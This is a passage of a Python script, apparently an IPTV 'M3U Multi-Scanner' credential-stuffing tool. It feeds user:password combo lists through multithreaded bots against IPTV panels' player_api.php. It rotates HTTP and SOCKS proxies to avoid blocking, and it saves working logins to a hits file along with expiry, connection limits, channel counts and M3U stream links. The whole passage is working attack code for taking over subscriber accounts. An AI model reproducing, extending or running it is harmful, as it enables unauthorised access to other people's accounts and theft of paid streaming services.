    			except:pass
        			
        			
    		
    		
    		url5="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
    		try:    			 
		    	 res = option.get(url5, headers=HEADERd, timeout=60, datafy=False)
    			 data=str(res.text)
    			 channelnumber=""    			 
    			 channelnumber=str(data.count("stream_id"))    			 
    			 print("stream_live OK")	
    		except:  
    			 channelnumber="❓"    		  			 
    		try:    			 
    			 url5="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
    			 res = option.get(url5, headers=HEADERd,timeout=60, datafy=False)
    			 data=str(res.text)
    			 filmnumber=""
    			 filmnumber=str(data.count("stream_id"))
    			 print("stream_VOD OK")			 
    		except:
    			 filmnumber="❓"         		
    		try:
    			 url5="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
    			 res = option.get(url5, headers=HEADERd,timeout=60, datafy=False)
    			 data=str(res.text)
    			 seriesnumber=""
    			 seriesnumber=str(data.count("series_id"))
    			 print("stream_SERIES OK")	    			 			  
    		except:
    			 seriesnumber="❓"     			     			         		
    		
    		m3u_link="http://"+realm+":"+port+"/get.php?username="+user+"&password="+passw+"&type=m3u_plus"
    		m3u_result, link_status=m3u_check(m3u_link)  		  	    		
    		if status=="Active":
    			statusp="\n├❪🔘❫ ✅ Status ➤ "+status	
    		else:
    			status="\n├❪🔘❫ 🛑 Status ➤ "+status	
    				    		
    		number=""
    		if statusproxym==1:
    			modeprint="""
╭─➤ [ 🔓 𝓟𝓡𝓞𝓧𝓨 𝓜𝓞𝓓𝓔 ]
╰─● Proxy ➤ """+proxysprint+"""
"""  			
    		else:
    			modeprint=""    
    				  		
    		mt=("""
╭─➤ ♦️ 🅼🆄🅻🆃🅸 - 🆂🅲🅰️🅽🅽🅴🆁 ♦️
╰────[ Mod by Tuga ]
"""+modeprint+"""
╭──➤ ❪❪ 🌐 🅂🄴🅁🅅🄴🅁 🌐 ❫❫
├● 🌍 𝙍𝙀𝘼𝙇 ➤ 
├● """+str(realm.replace('/stalker_portal','').replace('/c',''))+"""
├● 🌐 𝙋𝘼𝙉𝙀𝙇 ➤ 
╰─● http://"""+str(portal)+"""

╭──➤ ❪❪ 🔌 🄲🄾🄽🄽🄴🄲🅃 🔌 ❫❫
├● 👩‍ User ➤ """+user+"""
├● 🔑 Pass ➤ """+pas+"""
╰────────⧳

╭──➤ ℹ️ 🄸🄽🄵🄾 ℹ️"""+statusp+"""
├● 📆 Exp. ➤ """+expire+""" 
├● 👩 Act. Con. ➤ """+acon+"""
├● 🔛 Max. Online ➤ """+mcon+""" 
├● ⏰ TimeZone➤ """+timezone+"""
╰────────⧳
""")
    			
    			
        		        		        		    			
    		if not channelnumber =="":
    			number=("""
╭──➤ 📜 🅼3🆄 🄸🄽🄵🄾 📜
├● 📺 Channels ➤ """+channelnumber+"""
├● 🍿 Movies ➤"""+filmnumber+"""
├● 🎬 Series ➤"""+seriesnumber+"""
╰────────⧳ """)
    		signaturec=""
    		if channell=="1":
    			signaturec="""
╭─➤ 🅲🅾️🅽🆃🅴🅽🆃 🅻🅸🆂🆃 ➤
╰─● """+str(category)+""" """
    		mtl=(m3u_result)
    			
    			

    		if link_status == "🛑 OFFLINE":
    			fakehit=1       
    		else:
    			print(mt+number+mtl+signaturec+'\n')
    		hitr=""
    	
    
    
    def print(user): 
        file=open('/sdcard/Hits/'+hitn+'_M3U_by-Tuga.txt','a+') 
        file.write(user) 
        file.close() 
    cpm=0
    hitr=""
    def echox(bot,ptc,oddsc,hit):
    	global echo, hitr,usern,pasn   	  
    	global proxysok, proxysoklen,proxysbad, proxysbadlen
    	if statusproxym==1:    		
    		proxi="""
        
╭───➤ 🅿️🆁🅾️🆇🅸🅴🆂 🅸🅽🅵🅾 ➤ 
├● 🔘 TOTAL ➤ """+str(proxyslen)+"""
├● 🔴 BAD ➤ """+str(proxysbadlen)+""" 
╰─● 🟢 GOOD ➤ """+str(proxysoklen)+"""        
        
    		"""
    	else:
    		proxi=""   	
    		
    	echo=("""
╭─➤ ♦️ 🅼🆄🅻🆃🅸 - 🆂🅲🅰️🅽🅽🅴🆁 ♦️    
├──● Scan ➤ ᗰ3ᑌ         
├● 🌐 Panel ➤ """+str(portal.replace('/stalker_portal','').replace('/c',''))+        """
├● 🔢 Users ➤ """ +usern+""":"""+pasn+"""
├● 📊 Total ➤ """+str(ptc)+"""/"""+str(upset)+"""  [%"""+str(oddsc)+"""]  
├● 🎲 Hits ➤ """+str(hit)+""""""+hitr+"""
╰──● 🤖 Bots ➤ """+str(optionbots)+        """           
"""+proxi+"""""")
    	

    proxysok=[]
    proxysoklen=0
    proxysbad=[]
    proxysbadlen=0
    checkproxyend=0    	    
    selectprox=0
    def randomproxy():    
        global selectprox, proxysok, proxyslen, checkproxyend
        global proxysoklen,proxysbad, proxysbadlen
        dirp='/sdcard/proxy/'
        count=0    
        for files in os.listdir (dirp):
            count+=1
            if str(proxyfile)==str(count):
                pfile=(dirp+files)            
                #break            
        proxyf=open(pfile).readlines()
    
        proxyslen=len(proxyf)
        if selectprox==proxyslen:
            proxys=random.choice(proxysok)
            checkproxyend=1      
        else:
            selectprox+=1            
            proxys=(proxyf[selectprox])    
        return proxys    	
    
    def gui():       
        refresh=0
        oddsc=0
        ptc=0                     
        while True:              
            global echo,bot,pt, odds,hit            
            if oddsc <= odds:
                oddsc=odds
            if ptc<=pt:
                ptc=pt
            try:            
                echox(bot,ptc,oddsc,hit)
            except:pass
            #subprocess.run(["clear", ""]) 
            refresh+=1
            if refresh==100000:
                subprocess.run(["clear", ""])
                statusproxy()
                print(Tuga)  
                try:
                    print(echo)
                except:pass
                refresh=0

    	
    def run(optionbots):
            
        global botcount
        t2 = threading.Thread(target=gui)
        t2.start()
        for j in range(optionbots):
            t1 = threading.Thread(target=d1)
            t1.start()
            botcount=botcount+1
            time.sleep(2)
                 
    
    	
    hit=0	
    bot=""
    pt=0
    ptp=0
    odds=0
    botn=0    
    
    

    def myip():        
        url = 'http://httpbin.org/ip'
        try:
            ip = option.get(url, headers=headers, timeout=15).text        
            print(ip)
        except:pass           


    #quit()    
    def d1():
    	global pt,odds,hit, echo, botn, pasn,usern
    	global hit, botcount, hitr, fakehit
    	global proxysok, proxysoklen,proxysbad, proxysbadlen, checkproxyend    	
    	user=""    
    	pas=""
    	botcount=0
    	count=0
    	botn=botn+1
    	botg=botn 	
    	bot="Bot => "+str(botn)
    	proxys=""   	
    	for pt in range(botn,upset,optionbots):
    		up=re.search(pattern,totLen[pt],re.IGNORECASE)
    		
    		if up:
    			 pt1 = totLen[pt].split(":")
    			 
    			 try:
    			 	user=str(pt1[0].replace(" ",""))
    			 except:
    			 	userr='user'
    			 try:
    			 	pas=str(pt1[1].replace(" ",""))
    			 	pas=str(pas.replace('\n',""))
    			 except:
    			 	pas='12345'
    			 count = int(count) +1
    			 #bot='Bot_01'
    			 odds=0
    			 odds=round(((pt)/(upset)*100),2)
    			 #portal="vplay.club:8888"    			 
    			 #user="3"
    			 #pas="3"
    			 usern=user
    			 pasn=pas
    			 bott=bot+" ["+user+":"+pas+"]"    			 
    			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
    			 bag1=0
    			 data=""
    			 okprox=0
    			 proxyr=1
    			 proxysprint=""    			 
    			 while okprox==0:
    			 	proxyr=0	  						    	    			
    			 	if protocol==1:
    			 	 proxys=randomproxy()
    			 	 proxysprint=proxys       			          
    			 	 proxy.proxies = {
        			'https': proxys ,
        			'http': proxys
    			 	 }
    			 	if protocol==2:
    			 	 proxys=randomproxy()
    			 	 proxysprint=proxys        			          
    			 	 proxy.proxies = {
        			'https': 'socks4://'+proxys ,
        			'http': 'socks4://'+proxys
    			 	 }
    			 	if protocol==3:
    			 	 proxys=randomproxy()
    			 	 proxys='192.111.139.162:4145'     			              			 	 
    			 	 #print(proxys)
    			 	 proxysprint=proxys   
    			 	 proxy.proxies = {
        			'https': 'socks5://'+proxys ,
        			'http': 'socks5://'+proxys
    			 	 }
    			 	 
    			 	try:          
    			 	 #myip()
    			 	 print(user+":"+pas)		 	 
    			 	 res = option.get(link,headers=HEADERd, timeout=60, datafy=False) 
    			 	 proxyr=0
    			 	 print("Ok")
    			 	except:    			 	     			 	   			 	 			 		  			 	 			 		
    			 	 proxyr=1
    			 	 proxysbad+=[proxys]
    			 	 proxysbadlen=len(proxysbad)        			 		
    			 	if proxyr==0:
			 	      			 print("ok2")        			 	     
			 	      			 if statusproxym==1:			 	      			    			 	      			         		        		
			 	      			  if proxys in proxysok:
			 	      			   time.sleep(0.1)
			 	      			  else:
			 	      			   if checkproxyend==0:           
			 	      			    proxysok+=[proxys]
			 	      			  proxysoklen=len(proxysok)
			 	      			  			 	      			           			 	
			 	      			 data=str(res.text)
			 	      			 print(data)
			 	      			 
			 	      			 if 'Cloudflare' in data:
			 	      			     data="Cloudflare"
			 	      			 
			 	      			 if 'username' in data:
			 	      			     okprox=1
			 	      			     status=data.split('status":')[1]
			 	      			     status=status.split(',')[0]
			 	      			     status=status.replace('"',"")
			 	      			     if status=='Active':
			 	      			     	hit=hit+1
			 	      			     	hitr=" 💾 ..."
			 	      			     	approval(data,user,pas,proxysprint)
			 	      			     	if fakehit==1:
			 	          			     hit=hit-1
			 	      			 else:			 	      			    
			 	      			         okprox=1    
			 	

  			     	
    run(optionbots)	 			
			 			 			 						 			 			